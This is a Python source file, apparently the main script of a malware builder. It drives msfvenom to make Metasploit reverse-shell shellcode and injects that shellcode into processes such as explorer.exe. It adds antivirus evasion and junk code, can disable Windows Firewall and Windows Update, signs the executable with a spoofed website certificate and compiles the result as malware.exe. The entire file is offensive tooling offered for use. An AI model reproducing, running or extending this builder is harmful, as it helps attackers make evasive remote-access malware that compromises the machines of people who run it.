from lib import builder, cert, compiler, core, evasion, gen
import argparse
from os import makedirs, path
from shutil import which
from subprocess import call
from random import randrange

types = ""
architecture = ""
payload = ""
custom_shellcode = ""
lhost = "lhost="
lport = "lport="
msfvenom = []
filename = ""
vShellcode = ""
decoder_stub = ""
injection_type = ""
processname = ""
evasions = ""
junkcode = ""
intensity = 0
decoys = ""
windows_defender = ""
windows_firewall = ""
windows_update = ""
require_admin = ""
icon = ""
mscript = ""
final_code = ""


def check_requirements():
    required = ["x86_64-w64-mingw32-windres", "x86_64-w64-mingw32-gcc", "i686-w64-mingw32-windres", "i686-w64-mingw32-gcc", "rar", "msfvenom", "osslsigncode"]
    to_install = ["mingw-w64", "rar", "metasploit-framework", "osslsigncode"]
    not_installed = []
    for i in required:
        a = which(i)
        if a is None:
            core.not_installed(i)
            not_installed.append(i)

    if len(not_installed) != 0:
        for package in to_install:
            call(['apt-get', '-y', 'install', package])


def check_directory():
    directories = ["./output", "./tmp"]
    for i in directories:
        if not path.isdir(i):
            makedirs(i)


def check_payload_requirements():
    if args.lhost:
        if args.lport:
            if args.injectiontype:
                pass
            else:
                core.error_payload_injectiontype()
        else:
            core.error_payload_lport()
    else:
        core.error_payload_lhost()


def staged_or_no():
    is_staged_payload = "meterpreter/"
    if is_staged_payload in args.payload:
        return "yes"
    else:
        return "no"


def check_customopt():
    msfcommand = ['msfvenom', '-a', architecture, '--platform', 'windows', '-p', payload, lhost, lport, '--smallest', '-f', 'c']
    if args.msfcustom:
        customopt = args.msfcustom
        customopt = customopt.split(" ")
        for i in customopt:
            msfcommand.append(i)
        return msfcommand
    else:
        return msfcommand


def check_injectiontype():
    it = args.injectiontype
    if it == "remote":
        if architecture == "x86":
            core.warning_injectionType()
            return "local"
        else:
            return it
    else:
        return it


def check_procname():
    if args.procname:
        procname = args.procname
        if ".exe" in procname:
            if len(procname) > 4:
                return procname
            else:
                core.error_procname(procname)
        else:
            core.error_procname(procname)
    else:
        return "explorer.exe"


def check_evasion():
    if args.evasion:
        return "yes"
    else:
        return "no"


def check_junkcode():
    if args.junk:
        return "yes"
    else:
        return "no"


def check_intensity():
    if args.intensity:
        H = int(args.intensity)
        if H >= 7:
            return H
        else:
            H = randrange(1, 6)
            return H
    else:
        return randrange(1, 6)


def check_decoy():
    if args.decoy:
        decoy = args.decoy
        return str(decoy)
    else:
        return ""


def check_win_fwl():
    if args.winfwl:
        return "disable firewall"
    else:
        return "no"


def check_win_upt():
    if args.winupt:
        return "disable winupdate"
    else:
        return "no"


def check_admin():
    if args.admin:
        return "yes"
    else:
        return "no"


def check_spoof():
    if args.spoof:
        remote_cert = args.spoof
        if ":" in remote_cert:
            remote_cert = remote_cert.split(":")
            cert.spoofer(remote_cert[0], remote_cert[1], filename, "output/malware.exe")
        else:
            core.bad_certificate()
    else:
        return ""


def write_file():
    with open('tmp/source.cpp', 'w') as f:
        f.write(final_code)
    return ""


def check_icon():
    if args.icon:
        ico = args.icon
        if ".ico" in ico:
            if len(ico) > 4:
                if path.exists("icon/" + ico):
                    return ico
                else:
                    core.error_icon_file(ico)
            else:
                core.error_icon(ico)
        else:
            core.error_icon(ico)
    else:
        return ""


def check_compression():
    if args.compress:
        compiler.rar(filename)
    else:
        return "no"


def check_mscript():
    if args.mscript:
        core.mscript(architecture, types, payload, lhost, lport)
    else:
        return ""


if __name__ == '__main__':
    core.banner()
    check_requirements()
    check_directory()

    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--arch", help="Choose payload architecture", choices=["x86", "x64"], required=True)
    parser.add_argument("-p", "--payload", help="Choose the metasploit payload (exemple: windows/x64/meterpreter/reverse_tcp)", required=False)
    parser.add_argument("-lh", "--lhost", help="Set your lhost (exemple: 192.168.1.60)", required=False)
    parser.add_argument("-lp", "--lport", help="Set your lport (exemple: 4444)", required=False)
    parser.add_argument("-cO", "--msfcustom", help="Set your own msfvenom option (exemple: -cO='-e x64/xor_dynamic'", required=False)
    # parser.add_argument("-cS", "--customshell", help="Set your own shellcode", required=False)
    #  parser.add_argument("-cC", "--customshell", help="Set your custom cmd/powershell command", required=False)
    parser.add_argument("-o", "--filename", help="Choose the name of the output file (exemple: Malware)", required=True)
    parser.add_argument("-it", "--injectiontype", help="Set injection method (remote only for x64 architechture)", choices=["local", "remote"], required=True)
    parser.add_argument("-pn", "--procname", help="Choose process to inject shellcode for remote injection method (default/exemple: explorer.exe)", required=False)
    parser.add_argument("-e", "--evasion", help="Addition of functions that allow antivirus evasion", action='store_true', required=False)
    parser.add_argument("-j", "--junk", help="Injects junkcode into the main structure and functions present", action='store_true', required=False)
    parser.add_argument("-ji", "--intensity", help="Injects junkcode into the main structure and functions present", required=False)
    parser.add_argument("-d", "--decoy", help="Number of decoys to add (unlimited)  -  PS : 1 decoy = 1 secondes to sleep.", required=False)
    # parser.add_argument("-lb", "--logicbomb", help="The shellcode will be executed on a given date (exemple: 24:12:2025).", required=False)
    parser.add_argument("-wf", "--winfwl", help="Disable Windows Firewall", action='store_true', required=False)
    parser.add_argument("-wu", "--winupt", help="Disable Windows Update", action='store_true', required=False)
    parser.add_argument("-A", "--admin", help="Administrator privileges are required to run the program", action='store_true', required=False)
    parser.add_argument("-sc", "--spoof", help="Creates a spoofed certificate of any online website and signs an Executable (exemple: www.test.com:44)", required=False)
    parser.add_argument("-i", "--icon", help="Add your icon to EXE file (exemple: my_icon_name.ico)", required=False)
    parser.add_argument("-c", "--compress", help="Compress EXE file to RAR)", action='store_true', required=False)
    parser.add_argument("-ms", "--mscript", help="Run pre-configured MsfConsole", action='store_true', required=False)
    args = parser.parse_args()

    check_payload_requirements()
    types += staged_or_no()
    architecture += str(args.arch)
    payload += str(args.payload)
    lhost += str(args.lhost)
    lport += str(args.lport)
    msfvenom += check_customopt()
    vShellcode, decoder_stub = gen.shellcode_generation(msfvenom, junkcode, intensity)
    filename += "output/" + str(args.filename) + ".exe"
    injection_type += check_injectiontype()
    processname += check_procname()
    evasions += check_evasion()
    junkcode += check_junkcode()
    intensity += check_intensity()
    decoys += check_decoy()
    windows_firewall += check_win_fwl()
    windows_update += check_win_upt()
    require_admin += check_admin()
    final_code += builder.exercise_room(injection_type, processname, vShellcode, decoder_stub, architecture, junkcode, intensity, evasions, decoys, windows_firewall, windows_update, filename)
    file = write_file()
    icon += check_icon()
    compiler.auto_compile(filename, architecture, icon, require_admin)
    certificate = check_spoof()
    compression = check_compression()
    mscript = check_mscript()
